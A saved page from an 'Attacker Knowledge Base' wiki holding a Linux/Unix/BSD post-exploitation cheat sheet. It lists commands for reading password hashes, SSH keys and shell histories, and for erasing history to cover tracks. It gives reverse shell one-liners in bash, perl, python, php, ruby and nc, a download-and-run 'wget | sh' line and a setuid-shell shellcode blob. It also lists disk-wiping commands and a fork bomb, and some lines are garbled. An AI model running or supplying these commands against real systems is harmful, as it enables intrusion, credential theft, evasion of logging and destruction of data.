<!DOCTYPE html>
<!-- saved from url=(0057)http://attackerkb.com/Unix/LinuxUnixBSD_Post_Exploitation -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>Linux Unix Bsd Post Exploitation - Attacker Knowledge Base</title>
	
	<meta name="viewport" content="width=device-width, initial-scale=1">

	<link rel="shortcut icon" href="http://attackerkb.com/favicon.ico">
	<link rel="stylesheet" href="./Linux Unix Bsd Post Exploitation - Attacker Knowledge Base_files/bootstrap.min.css">
	<link rel="stylesheet" href="./Linux Unix Bsd Post Exploitation - Attacker Knowledge Base_files/solarized_light.css">
	<link rel="stylesheet" href="./Linux Unix Bsd Post Exploitation - Attacker Knowledge Base_files/raneto.css">

	
<style id="fit-vids-style">.fluid-width-video-wrapper{width:100%;position:relative;padding:0;}.fluid-width-video-wrapper iframe,.fluid-width-video-wrapper object,.fluid-width-video-wrapper embed {position:absolute;top:0;left:0;width:100%;height:100%;}</style></head>
<body class="page-unix-linux-unix-b-s-d-post-exploitation">

	<header class="header">
		<div class="container-fluid">
			<div class="row">
				<div class="col-sm-6">

					<a href="http://attackerkb.com/" class="logo">Attacker Knowledge Base</a>

				</div>
				<div class="col-sm-6">

					<form class="search-form form-inline pull-right" role="form" action="http://attackerkb.com/">
						<div class="form-group">
							<label class="sr-only" for="search">Search</label>
							<input type="search" class="form-control" name="search" id="search" size="30" value="" placeholder="Search">
						</div>
					</form>

				</div>
			</div>
		</div>
	</header>

	<div class="container-fluid">
		<div class="row">
    <div class="col-sm-3">

        <ul class="menu">
                    <li class="page"><a href="http://attackerkb.com/Contributing">Contributing</a></li>
            <li class="category">
                <h5 class="category-title">Combinations</h5>
                <ul class="pages">
                    <li class="page"><a href="http://attackerkb.com/Combinations/ReverseProxyAttackTools">Reverse Proxy Attack Tools</a></li>
                </ul>
            </li>
            <li class="category">
                <h5 class="category-title">Dns</h5>
                <ul class="pages">
                    <li class="page"><a href="http://attackerkb.com/DNS/iterative%20brute%20forcing">Iterative Brute Forcing</a></li>
                    <li class="page"><a href="http://attackerkb.com/DNS/srv">Srv</a></li>
                </ul>
            </li>
            <li class="category">
                <h5 class="category-title">Hashcat</h5>
                <ul class="pages">
                    <li class="page"><a href="http://attackerkb.com/Hashcat/hashcat_cheatsheet">Hashcat Cheatsheet</a></li>
                </ul>
            </li>
            <li class="category">
                <h5 class="category-title">Impacket</h5>
                <ul class="pages">
                    <li class="page"><a href="http://attackerkb.com/Impacket/MS14-068">Ms14 068</a></li>
                    <li class="page"><a href="http://attackerkb.com/Impacket/wmiexec">Wmiexec</a></li>
                </ul>
            </li>
            <li class="category">
                <h5 class="category-title">Metasploit</h5>
                <ul class="pages">
                    <li class="page"><a href="http://attackerkb.com/Metasploit/MS14-068">MSF / MS14-068</a></li>
                </ul>
            </li>
            <li class="category">
                <h5 class="category-title">Mimikatz</h5>
                <ul class="pages">
                    <li class="page"><a href="http://attackerkb.com/Mimikatz/Kerberos">Kerberos</a></li>
                </ul>
            </li>
            <li class="category">
                <h5 class="category-title">Osx</h5>
                <ul class="pages">
                    <li class="page"><a href="http://attackerkb.com/OSX/parallels">Parallels</a></li>
                    <li class="page"><a href="http://attackerkb.com/OSX/persistence">Persistence</a></li>
                </ul>
            </li>
            <li class="category">
                <h5 class="category-title">Oracle</h5>
                <ul class="pages">
                    <li class="page"><a href="http://attackerkb.com/Oracle/TNS">Tns</a></li>
                </ul>
            </li>
            <li class="category">
                <h5 class="category-title">Powershell</h5>
                <ul class="pages">
                    <li class="page"><a href="http://attackerkb.com/Powershell/Powershell_Empire">Powershell Empire</a></li>
                </ul>
            </li>
            <li class="category">
                <h5 class="category-title">Scanning</h5>
                <ul class="pages">
                    <li class="page"><a href="http://attackerkb.com/Scanning/ports">Ports</a></li>
                    <li class="page"><a href="http://attackerkb.com/Scanning/zenmap">Zenmap</a></li>
                </ul>
            </li>
            <li class="category">
                <h5 class="category-title">Unix</h5>
                <ul class="pages">
                    <li class="page active"><a href="http://attackerkb.com/Unix/LinuxUnixBSD_Post_Exploitation">Linux Unix Bsd Post Exploitation</a></li>
                    <li class="page"><a href="http://attackerkb.com/Unix/Misc_Bash">Misc Bash</a></li>
                    <li class="page"><a href="http://attackerkb.com/Unix/OSX_Commands">Osx Commands</a></li>
                    <li class="page"><a href="http://attackerkb.com/Unix/Tmux_and_Screen_Cheatsheet">Tmux And Screen Cheatsheet</a></li>
                </ul>
            </li>
            <li class="category">
                <h5 class="category-title">Web</h5>
                <ul class="pages">
                    <li class="page"><a href="http://attackerkb.com/Web/Quick%20Web%20Servers">Quick Web Servers</a></li>
                    <li class="page"><a href="http://attackerkb.com/Web/Web%20Shells%20-%20JSP">Web Shells Jsp</a></li>
                </ul>
            </li>
            <li class="category">
                <h5 class="category-title">Windows</h5>
                <ul class="pages">
                    <li class="page"><a href="http://attackerkb.com/Windows/blind_files">Blind Files</a></li>
                    <li class="page"><a href="http://attackerkb.com/Windows/overpass_kerberos">Overpass Kerberos</a></li>
                    <li class="page"><a href="http://attackerkb.com/Windows/rpcclient">Rpcclient</a></li>
                </ul>
            </li>
        </ul>

    </div>
    <div class="col-sm-9">

        <section class="content">
            <h1 class="title">Linux Unix Bsd Post Exploitation</h1>

            <p>Linux/Unix/BSD Post-Exploitation
Command List
If for any reason you cannot access/edit these files in the future, please contact
mubix@hak5.org
You can download these files in any format using Google Doc’s
File-&gt;Download As method
If you are viewing this on anything other than Google Docs, you can get
access to the latest links to the Linux/Unix/BSD, OS X, Obscure, Metasploit, and
Windows docs here: <a href="http://bit.ly/nuc0N0">http://bit.ly/nuc0N0</a></p>
<p>(things to pull when all you can do is blindly read) LFI/dir traversal (Don’t forget %00!)</p>
<h2 id="blind-files">Blind Files</h2>
<table class="table">
<thead>
<tr>
<th>File</th>
<th>Contents and Reason</th>
</tr>
</thead>
<tbody>
<tr>
<td>/etc/resolv.conf</td>
<td>Contains the current name servers (DNS) for the system. This is a globally readable file that is less likely to trigger IDS alerts than /etc/passwd</td>
</tr>
<tr>
<td>/etc/motd</td>
<td>Message of the Day.</td>
</tr>
<tr>
<td>/etc/issue</td>
<td>Debian - current version of distro</td>
</tr>
<tr>
<td>/etc/passwd</td>
<td>List of local users</td>
</tr>
<tr>
<td>/etc/shadow</td>
<td>List of users’ passwords’ hashes (requires root)</td>
</tr>
<tr>
<td>~/.bash_history[d]</td>
<td>Will give you some directory context</td>
</tr>
<tr>
<td>~/.mysql_history</td>
<td>MySQL database history - could have passwords</td>
</tr>
</tbody>
</table>
<h2 id="system">System</h2>
<table class="table">
<thead>
<tr>
<th>Command</th>
<th>Description and/or Reason</th>
</tr>
</thead>
<tbody>
<tr>
<td>uname -a</td>
<td>Prints the kernel version, arch, sometimes distro, ...</td>
</tr>
<tr>
<td>ps aux</td>
<td>List all running processes</td>
</tr>
<tr>
<td>top -n 1 -d</td>
<td>Print process, 1 is a number of lines</td>
</tr>
<tr>
<td>id</td>
<td>Your current username, groups</td>
</tr>
<tr>
<td>arch, uname -m[e]</td>
<td>Kernel processor architecture</td>
</tr>
<tr>
<td>w</td>
<td>who is connected, uptime and load avg</td>
</tr>
<tr>
<td>who -a</td>
<td>uptime, runlevel, tty, proceses etc.</td>
</tr>
<tr>
<td>gcc -v</td>
<td>Returns the version of GCC.</td>
</tr>
<tr>
<td>mysql --version</td>
<td>Returns the version of MySQL.</td>
</tr>
<tr>
<td>perl -v</td>
<td>Returns the version of Perl.</td>
</tr>
<tr>
<td>ruby -v</td>
<td>Returns the version of Ruby.</td>
</tr>
<tr>
<td>python --version</td>
<td>Returns the version of Python.</td>
</tr>
<tr>
<td>df -k</td>
<td>mounted fs, size, % use, dev and mount point[</td>
</tr>
<tr>
<td>mount</td>
<td>mounted fs</td>
</tr>
<tr>
<td>last -a</td>
<td>Last users logged on</td>
</tr>
<tr>
<td>lastcomm</td>
<td></td>
</tr>
<tr>
<td>lastlog</td>
<td></td>
</tr>
<tr>
<td>lastlogin (BSD)</td>
<td></td>
</tr>
<tr>
<td>getenforce</td>
<td>Get the status of SELinux (Enforcing, Permissive or Disabled)</td>
</tr>
<tr>
<td>dmesg</td>
<td>Informations from the last system boot</td>
</tr>
<tr>
<td>lspci</td>
<td>prints all PCI buses and devices</td>
</tr>
<tr>
<td>lsusb</td>
<td>prints all USB buses and devices/h</td>
</tr>
<tr>
<td>lscpu</td>
<td>prints CPU information</td>
</tr>
<tr>
<td>lshw</td>
<td></td>
</tr>
<tr>
<td>ex</td>
<td></td>
</tr>
<tr>
<td>cat /proc/cpuinfo</td>
<td></td>
</tr>
<tr>
<td>cat /proc/meminfo</td>
<td></td>
</tr>
<tr>
<td>du -h --max-depth=1 /</td>
<td>(note: can cause heavy disk i/o)</td>
</tr>
<tr>
<td>which nmap</td>
<td>locate a command (ie nmap or nc)</td>
</tr>
<tr>
<td>locate bin/nmap</td>
<td></td>
</tr>
<tr>
<td>locate bin/nc</td>
<td></td>
</tr>
<tr>
<td>jps -l</td>
<td></td>
</tr>
<tr>
<td>java -version</td>
<td>Returns the version of Java.</td>
</tr>
</tbody>
</table>
<h2 id="networking">Networking</h2>
<ul>
<li>hostname -f</li>
<li>ip addr show</li>
<li>ip ro show</li>
<li>ifconfig -a</li>
<li>route -n</li>
<li>cat /etc/network/interfaces</li>
<li>iptables -L -n -v</li>
<li>iptables -t nat -L -n -v</li>
<li>ip6tables -L -n -v</li>
<li>iptables-save</li>
<li>netstat -anop</li>
<li>netstat -r</li>
<li>netstat -nltupw (root with raw sockets)</li>
<li>arp -a</li>
<li>lsof -nPi</li>
</ul>
<p>The information returned by these commands can also be acquired through 
“cat /proc/net/*”. This is less likely to trigger monitoring alerts. The 
drawback is that it generates a lot of information which then has to be 
analyzed.</p>
<h3 id="user-accounts">User accounts</h3>
<ul>
<li>local accounts: cat /etc/passwd
<strong> password hashes in /etc/shadow on Linux
</strong> password hashes in /etc/security/passwd on AIX
** groups in /etc/group (and/or /etc/gshadow on Linux)</li>
<li>all accounts: getent passwd
<strong> should dump local, LDAP, NIS, whatever the system is using
</strong> same with getent group</li>
<li>Samba’s own database: pdbedit -L -w or pdbedit -L -v</li>
<li>privileged accounts: cat
** (above: cat ???)</li>
<li>mail aliases: cat /etc/aliases find /etc -name aliases, getent aliases</li>
<li>NIS accounts: ypcat passwd - displays NIS password file</li>
</ul>
<h2 id="credentials">Credentials</h2>
<ul>
<li>SSH keys, often passwordless: /home/<em>/.ssh/id</em></li>
<li>SSH agent:
<em>* Kerberos tickets: /tmp/krb5{cc_</em>,.keytab}</li>
<li>PGP keys: /home/*/.gnupg/secring.gpgs</li>
</ul>
<h2 id="configs">Configs</h2>
<ul>
<li>ls -aRl /etc/ | awk '$1 ~ /w.$/' | grep -v lrwx 2&gt;/dev/nullte</li>
<li>cat /etc/issue{,.net}</li>
<li>cat /etc/master.passwd</li>
<li>cat /etc/group</li>
<li>cat /etc/hosts</li>
<li>cat /etc/crontab</li>
<li>cat /etc/sysctl.conf</li>
<li>for user in $(cut -f1 -d: /etc/passwd); do echo $user; crontab -u $user -l; done # (Lists all crons)</li>
<li>cat /etc/resolv.conf</li>
<li>cat /etc/syslog.conf</li>
<li>cat /etc/chttp.conf</li>
<li>cat /etc/lighttpd.conf</li>
<li>cat /etc/cups/cupsd.confcda</li>
<li>cat /etc/inetd.conf</li>
<li>cat /opt/lampp/etc/httpd.conf</li>
<li>cat /etc/samba/smb.conf</li>
<li>cat /etc/openldap/ldap.conf</li>
<li>cat /etc/ldap/ldap.conf</li>
<li>cat /etc/exports</li>
<li>cat /etc/auto.master</li>
<li>cat /etc/auto_master</li>
<li>cat /etc/fstab</li>
<li>find /etc/sysconfig/ -type f -exec cat[f][g][h] {} \;</li>
</ul>
<h2 id="determine-distro">Determine Distro</h2>
<ul>
<li>lsb_release -d                                 # Generic command for all LSB distros</li>
<li>/etc/os-release                                # Generic for distros using “systemd”</li>
<li>/etc/issue                                     # Generic but often modified</li>
<li>cat /etc/*release</li>
<li>/etc/SUSE-release                              # Novell SUSE</li>
<li>/etc/redhat-release, /etc/redhat_version       # Red Hat</li>
<li>/etc/fedora-release                            # Fedora</li>
<li>/etc/slackware-release, /etc/slackware-version # Slackware</li>
<li>/etc/debian_release, /etc/debian_version       # Debian</li>
<li>/etc/mandrake-release                          # Mandrake</li>
<li>/etc/sun-release                               # Sun JDS</li>
<li>/etc/release                                   # Solaris/Sparc</li>
<li>/etc/gentoo-release                            # Gentoo</li>
<li>/etc/arch-release                              # Arch Linux (file will be empty)</li>
<li>arch                                           # OpenBSD; sample: “OpenBSD.amd64”</li>
<li>uname -a                                       # often hints at it pretty well</li>
</ul>
<h2 id="packages">Packages</h2>
<h3 id="redhat">Redhat</h3>
<ul>
<li>rpm -qa --last | head</li>
<li>yum list | grep installed<h4 id="sources-">Sources:</h4>
</li>
<li>cat /etc/yum.{conf,repos.d/*}<h3 id="debian-dpkg-l">Debian:                dpkg -l</h3>
</li>
<li>dpkg -l | grep -i “linux-image”</li>
<li>dpkg --get-selections<h4 id="sources-">Sources:</h4>
</li>
<li>cat /etc/apt/sources.list{,.d/*}<h3 id="-free-net-bsd-pkg_info">{Free,Net}BSD:        pkg_info</h3>
<h3 id="solaris-pkginfo">Solaris:                pkginfo</h3>
<h3 id="gentoo-equery-must-be-installed">Gentoo:                          # equery must be installed</h3>
</li>
<li>cd /var/db/pkg/ &amp;&amp; ls -d <em>/</em>        # always works<h3 id="arch-linux-pacman-q">Arch Linux:                pacman -Q</h3>
</li>
</ul>
<h2 id="finding-important-files">Finding Important Files</h2>
<ul>
<li>ls -dlR */ #</li>
<li>ls -alR | grep ^d</li>
<li>find /var -type d</li>
<li>ls -dl <code>find /var -type d</code></li>
<li>ls -dl <code>find /var -type d</code> | grep -v root</li>
<li>find /var ! -user root -type d -ls</li>
<li>find /var/log -type f -exec ls -la {} \;</li>
<li>find / -perm -4000 (find all suid files)</li>
<li>ls -alhtr /mnt</li>
<li>ls -alhtr /media</li>
<li>ls -alhtr /tmp</li>
<li>ls -alhtr /home</li>
<li>cd /home/; treels /home/<em>/.ssh/</em></li>
<li>find /home -type f -iname '.*history'</li>
<li>ls -lart /etc/rc.d/</li>
<li>locate tar | grep [.]tar$  # Remember to updatedb before running locate</li>
<li>locate tgz | grep [.]tgz$</li>
<li>locate sql | grep [.]sql$</li>
<li>locate settings | grep [.]php$</li>
<li>locate config.inc | grep [.]php$</li>
<li>ls /home/<em>/id</em></li>
<li>.properties | grep [.]properties # java config files</li>
<li>locate .xml | grep [.]xml # java/.net config files</li>
<li>find /sbin /usr/sbin /opt /lib <code>echo $PATH | ‘sed s/:/ /g’</code> -perm /6000  -ls # find suids</li>
<li>locate rhosts</li>
</ul>
<h1 id="covering-your-tracks">Covering Your Tracks</h1>
<h2 id="avoiding-history-filesmys">Avoiding history filesmys</h2>
<ul>
<li>export HISTFILE=
or</li>
<li>unset HISTFILE
This next one might not be a good idea, because a lot of folks know to check for tampering with this file, and will be suspicious if they find out:</li>
</ul>
<p>However if you happen to be on an account that was originally inaccessible, if the .bash_history file is available (ls -a ~), viewcating its contents can provide you with a good deal of information about the system and its most recent updates/changes.
clear all history in ram</p>
<ul>
<li>history -c</li>
<li>rm -rf ~/.bash_history &amp;&amp; ln -s ~/.bash_history /dev/null (invasive)</li>
<li>touch ~/.bash_history (invasive)</li>
<li><space> history -c (using a space before a command)</space></li>
<li>zsh% unset HISTFILE HISTSIZE</li>
<li>tcsh% set history=0</li>
<li>bash$ set |o history</li>
<li>ksh$ unset HISTFILE</li>
<li>find / -type f -exec {} (forensics nightmare)</li>
</ul>
<p>Note that you’re probably better off modifying or temporary disabling rather than deleting history files, it leaves a lot less traces and is less suspect.</p>
<p>In some cases HISTFILE and HISTFILESIZE are made read-only; get around this by explicitly clearing history (history -c) or by kill -9 $$’ing the shell. Sometimes the shell can be configured to run ‘history -w’ after every command; get around this by overriding ‘history’ with a no-op shell function. None of this will help if the shell is configured to log everything to syslog, however.
Obtain users’ information</p>
<ul>
<li>ls -alh /home/*/</li>
<li>ls -alh /home/*/.ssh/</li>
<li>cat /home/*/.ssh/authorized_keys</li>
<li>cat /home/*/.ssh/known_hosts</li>
<li>cat /home/<em>/.</em>hist* # you can learn a lot from this</li>
<li>find /home/<em>/.vnc /home/</em>/.subversion -type f</li>
<li>grep ^ssh /home/<em>/.</em>hist*</li>
<li>grep ^telnet `/home/<em>/.</em>hist*</li>
<li>grep ^mysql /home/<em>/.</em>hist*</li>
<li>cat /home/*/.viminfo</li>
<li>sudo -l # if sudoers is not. readable, this sometimes works per user</li>
<li>crontab -l</li>
<li>cat /home/*/.mysql_history[i]</li>
</ul>
<h1 id="escalating">Escalating</h1>
<p>Looking for possible opened paths</p>
<ul>
<li>ls -alh /root/</li>
<li>sudo -l</li>
<li>cat /etc/sudoers</li>
<li>cat /etc/shadow</li>
<li>cat /etc/master.passwd # OpenBSD</li>
<li>cat /var/spool/cron/crontabs/<em> | cat /var/spool/cron/</em></li>
<li>lsof -nPi</li>
<li>ls /home/<em>/.ssh/</em></li>
</ul>
<h1 id="maintaining-control">Maintaining control</h1>
<h2 id="reverse-shell">Reverse Shell</h2>
<p>Starting list sourced from: <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p>
<ul>
<li>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1 (No /dev/tcp on older Debians, but use nc, socat, TCL, awk or any interpreter like Python, and so on.).</li>
<li>perl -e 'use Socket; $i="10.0.0.1"; $p=1234; socket(S,PF_INET, SOCK_STREAM, getprotobyname("tcp")); if(connect(S,sockaddr_in($p,inet_aton($i)))){ open(STDIN,"&gt;&amp;S"); open(STDOUT,"&gt;&amp;S"); open(STDERR,"&gt;&amp;S"); exec("/bin/sh -i");};'</li>
<li>python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("10.0.0.1",1234)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'</li>
<li>php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</li>
<li>ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i; exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)' nc -e /bin/sh 10.0.0.1 1234 # note need -l on some versions, and many does NOT support -e anymore</li>
<li>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</li>
<li>xterm -display 10.0.0.1:1se</li>
<li>Listener- Xnest :1</li>
<li>Add permission to connect- xhost |victimIP</li>
<li>ssh -NR 3333:localhost:22 user@yourhost</li>
<li>nc -e /bin/sh 10.0.0.1 1234</li>
</ul>
<p>Fun if Windows is present and accessible
If there is Windows installed and the logged-in user access level includes those Windows partition, attacker can mount them up and do a much deeper information gathering, credential theft and root-ing. Ntfs-3g is useful for mounting ntfs partitions read-write.
TODO: insert details on what to look for</p>
<p>Stuff to be sorted</p>
<h1 id="going-to-move-everything-here-for-legibility-once-editing-dies-down">GOING TO MOVE EVERYTHING HERE FOR LEGIBILITY ONCE EDITING DIES DOWN</h1>
<table class="table">
<thead>
<tr>
<th>Command</th>
<th>Output</th>
</tr>
</thead>
<tbody>
<tr>
<td>ps aux</td>
<td>List of running processes</td>
</tr>
<tr>
<td>id</td>
<td>List current user and group along with user/group id</td>
</tr>
<tr>
<td>w</td>
<td>Show info about who is logged, what are they are doing</td>
</tr>
<tr>
<td>who -a</td>
<td>Print information about users</td>
</tr>
<tr>
<td>cat /dev/core &gt; /dev/audio</td>
<td></td>
</tr>
<tr>
<td>cat /dev/mem &gt; /dev/audio</td>
<td>Makes a sound from the memory content. Usefulness of this??? (none, aside from pissing off the sysadmin, in the very unlikely case that the server has speakers and the legacy OSS driver)</td>
</tr>
<tr>
<td>sudo -p</td>
<td>allows the user to define what the password prompt will be (useful for fun customization with aliases or shell scripts)</td>
</tr>
</tbody>
</table>
<h2 id="deleting-and-destroying">Deleting and Destroying</h2>
<p>(If it is necessary to leave the machine inaccessible or unusable)
Note that this tends to be quite evident (as opposed to a simple exploitation that might go unnoticed for some time, even forever), and will most surely get you into troubles.</p>
<p>Oh, and you’re probably a jerk if you use any of the stuff below.
| Command | Description |
|---------|-------------|
| mkfs.ext3 /dev/sda | Reformat the device mentioned, making recovery of files hard. |
| dd if=/dev/zero of=/dev/sda bs=1M | Overwrite disk /dev/sda with zeros |
| rm -rf / | This will recursively try to delete all files. |</p>
<pre><code class=" hljs tex">char esp<span class="hljs-special">[</span><span class="hljs-special">]</span> __attribute__ ((section(”.text”))) /* e.s.p release */ = 
“<span class="hljs-command">\xeb</span><span class="hljs-command">\x</span>3e<span class="hljs-command">\x</span>5b<span class="hljs-command">\x</span>31<span class="hljs-command">\xc</span>0<span class="hljs-command">\x</span>50<span class="hljs-command">\x</span>54<span class="hljs-command">\x</span>5a<span class="hljs-command">\x</span>83<span class="hljs-command">\xec</span><span class="hljs-command">\x</span>64<span class="hljs-command">\x</span>68″
“<span class="hljs-command">\xff</span><span class="hljs-command">\xff</span><span class="hljs-command">\xff</span><span class="hljs-command">\xff</span><span class="hljs-command">\x</span>68<span class="hljs-command">\xdf</span><span class="hljs-command">\xd</span>0<span class="hljs-command">\xdf</span><span class="hljs-command">\xd</span>9<span class="hljs-command">\x</span>68<span class="hljs-command">\x</span>8d<span class="hljs-command">\x</span>99″
“<span class="hljs-command">\xdf</span><span class="hljs-command">\x</span>81<span class="hljs-command">\x</span>68<span class="hljs-command">\x</span>8d<span class="hljs-command">\x</span>92<span class="hljs-command">\xdf</span><span class="hljs-command">\xd</span>2<span class="hljs-command">\x</span>54<span class="hljs-command">\x</span>5e<span class="hljs-command">\xf</span>7<span class="hljs-command">\x</span>16<span class="hljs-command">\xf</span>7″
“<span class="hljs-command">\x</span>56<span class="hljs-command">\x</span>04<span class="hljs-command">\xf</span>7<span class="hljs-command">\x</span>56<span class="hljs-command">\x</span>08<span class="hljs-command">\xf</span>7<span class="hljs-command">\x</span>56<span class="hljs-command">\x</span>0c<span class="hljs-command">\x</span>83<span class="hljs-command">\xc</span>4<span class="hljs-command">\x</span>74<span class="hljs-command">\x</span>56″
“<span class="hljs-command">\x</span>8d<span class="hljs-command">\x</span>73<span class="hljs-command">\x</span>08<span class="hljs-command">\x</span>56<span class="hljs-command">\x</span>53<span class="hljs-command">\x</span>54<span class="hljs-command">\x</span>59<span class="hljs-command">\xb</span>0<span class="hljs-command">\x</span>0b<span class="hljs-command">\xcd</span><span class="hljs-command">\x</span>80<span class="hljs-command">\x</span>31″
“<span class="hljs-command">\xc</span>0<span class="hljs-command">\x</span>40<span class="hljs-command">\xeb</span><span class="hljs-command">\xf</span>9<span class="hljs-command">\xe</span>8<span class="hljs-command">\xbd</span><span class="hljs-command">\xff</span><span class="hljs-command">\xff</span><span class="hljs-command">\xff</span><span class="hljs-command">\x</span>2f<span class="hljs-command">\x</span>62<span class="hljs-command">\x</span>69″
“<span class="hljs-command">\x</span>6e<span class="hljs-command">\x</span>2f<span class="hljs-command">\x</span>73<span class="hljs-command">\x</span>68<span class="hljs-command">\x</span>00<span class="hljs-command">\x</span>2d<span class="hljs-command">\x</span>63<span class="hljs-command">\x</span>00″
“cp -p /bin/sh /tmp/.beyond; chmod 4755 /tmp/.beyond;”;
</code></pre><p>Hex version of rm -rf /
How is this supposed to work?</p>
<h2 id="execute-a-remote-script">Execute a remote script</h2>
<p>This command forces the download of a file and immediately its execution, can be exploited easily using or reverse shit</p>
<blockquote>
<p>wget <a href="http://server/file.sh">http://server/file.sh</a> -O- | sh</p>
</blockquote>
<h2 id="fork-bomb">Fork Bomb</h2>
<blockquote>
<p>:(){:|:&amp;};:</p>
</blockquote>
<p>The [in]famous "fork bomb". This command will cause your system to run a large number of processes, until it "hangs". This can often lead to data loss (e.g. if the user brutally reboots, or the OOM killer kills a process with unsaved work). If left alone for enough time a system can eventually recover from a fork bomb.</p>
<h2 id="stolen-from-http-incolumitas-com-wp-content-uploads-2012-12-blackhats_view-pdf">Stolen from: <a href="http://incolumitas.com/wp-content/uploads/2012/12/blackhats_view.pdf">http://incolumitas.com/wp-content/uploads/2012/12/blackhats_view.pdf</a></h2>
<ul>
<li>World writable directories
** Find word writable folders outside your home directory. It would be a tremendous success if we could write, say to /etc. So we could add configuration files and therefore pretty sure execute code as root, since many daemons read a specific number of primary and secondary configuration files, whereas the secondary ones are often not created yet. If the superusers home (/root) would be writable, we could create shell startup files that doesn't exist yet: .profile,
.bash_profile, .bashrc...</li>
</ul>
<blockquote>
<p>find / ( ­wholename '/home/homedir/*' ­prune ) \
­o ( ­type d ­perm ­0002 ) \
­exec ls ­ld '{}' ';' 2&gt;/dev/null</p>
</blockquote>
<p>** What if /etc/passwd would be writable? Yeah, we just could add another root user and we would have won! Whereas the foregoing scenario is just too good to be true, it really makes sense to search for world writable files outside your own territory (= your home directory).</p>
<blockquote>
<p>find / ( ­wholename '/home/homedir/<em>' ­prune ­o \
  ­wholename '/proc/</em>' ­prune ) \
­o ( ­type f ­perm ­0002 ) \
­exec ls ­l '{}' ';' 2&gt;/dev/null</p>
</blockquote>
<ul>
<li>Logfiles
** Sometimes a security unaware administrator chmods a sensitive log file, because he couldn't view it and therefore leaks potentially sensitive data such as passwords or other important information.</li>
</ul>
<blockquote>
<p>find /var/log ­type f ­perm ­0004 2&gt;/dev/null</p>
</blockquote>
<ul>
<li>Setuid / setgid files
** We already examined fully why setuid and setgid files are worth to be double checked. Such a file owned by root and susceptible for attacks is a big weakness.<blockquote>
<p>find / ( ­type f ­or ­type d ) ­perm ­6000 2&gt;/dev/null</p>
</blockquote>
</li>
</ul>
<h1 id="todo">TODO</h1>
<ul>
<li>no shellshock (web, dhcp, ssh, etc) info</li>
<li>~/foo is common unix nomenclature - use it</li>
<li>file /sbin/init - anything else can lie :)</li>
<li>Just as a general thing - find isn't entirely portable so I wouldn't use it here/in a script when it wasn't useful. Maybe:
<strong> grep -r '' /etc/sysconfig/*
</strong>  fgrep -r '' /etc/sysconfig/<em>
*</em>  grep -fr /etc/sysconfig/</li>
<li>/etc/wpa_supplicant/wpa_supplicant.conf /etc/NetworkManager/<wlan dev="">/<network></network></wlan></li>
<li>Is there a place for commands to issue as root vs. non-privileged user?</li>
<li>Just for Fun  - "apt-get install sl" (Distro debian based) then to any command create an alias of sl</li>
</ul>


            <div class="page-meta clearfix">
                <div class="contact-support pull-left">
                    <span class="glyphicon glyphicon-envelope"></span> Want to contribute? <a href="mailto:mubix@hak5.org">Get in touch!</a>
                </div>
                <div class="last-updated pull-right">
                    Last updated on 5th Jul 2017
                </div>
            </div>
        </section>

    </div>
</div>

	</div>

	<footer class="footer">
		<div class="container-fluid">

			<p class="copyright pull-right">Copyright © 2019 - <a href="http://raneto.com/">Powered by Raneto</a></p>

		</div>
	</footer>

	<script src="./Linux Unix Bsd Post Exploitation - Attacker Knowledge Base_files/jquery.min.js.download"></script>
	<script src="./Linux Unix Bsd Post Exploitation - Attacker Knowledge Base_files/bootstrap.min.js.download"></script>
	<script src="./Linux Unix Bsd Post Exploitation - Attacker Knowledge Base_files/highlight.pack.js.download"></script>
	<script src="./Linux Unix Bsd Post Exploitation - Attacker Knowledge Base_files/jquery.fitvids.js.download"></script>
	<script src="./Linux Unix Bsd Post Exploitation - Attacker Knowledge Base_files/masonry.pkgd.min.js.download"></script>
	<script src="./Linux Unix Bsd Post Exploitation - Attacker Knowledge Base_files/raneto.js.download"></script>



</body></html>